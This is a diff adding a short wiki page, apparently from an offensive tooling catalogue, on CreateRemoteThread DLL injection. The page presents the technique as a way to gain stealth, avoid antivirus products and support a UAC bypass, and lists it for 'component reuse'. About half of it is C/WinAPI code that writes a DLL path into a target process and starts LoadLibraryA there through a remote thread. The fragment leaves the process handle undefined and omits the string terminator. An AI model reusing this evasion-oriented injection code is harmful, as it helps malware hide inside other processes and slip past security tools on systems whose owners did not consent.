@@ -1,0 +1,27 @@
+
+                        CreateRemoteThread DLL Injection
+Overview
+This illustrate a method of using a DLL to execute code in the context of another process. More complete sample code is available in Teamforge, in the UACUser Account Control Bypass sample code, where it is used to borrow the ability of Microsoft executables to bypass UACUser Account Control in some cases. Injection can be used to achieve stealth and in some cases to avoid PSPs.
+
+#define DLL_NAME "Injected.dll"
+#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
+LoadLibAddr = (LPVOID) GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "LoadLibraryA");
+ 
+//Allocates a buffer for and writes the path to the DLLDynamic Link Library we want to inject inside of the target process's memory
+RemoteString = (LPVOID) VirtualAllocEx(Proc, NULL, strlen(DLL_NAME),MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+WriteProcessMemory(Proc,(LPVOID)RemoteString, DLL_NAME, strlen(DLL_NAME), NULL);
+ 
+//Calls LoadLibrary on our specified DLLDynamic Link Library in the target process
+CreateRemoteThread(Proc,NULL,NULL, (LPTHREAD_START_ROUTINE) LoadLibAddr, (LPVOID)RemoteString, NULL, NULL);
+The name/path of the DLL to be loaded must be passed to LoadLibrary, but any string literals we provide will not be in the memory space of the target process. Thus, we must copy the literal there before calling CreateRemoteThread.
+This is a well-known technique and may trigger PSPPersonal Security Product (Anti-Virus) warnings.
+Source
+Public Internet
+Component Reuse
+UACBypass sample
+
+
+Previous versions:
+| 1 
+|
+                    
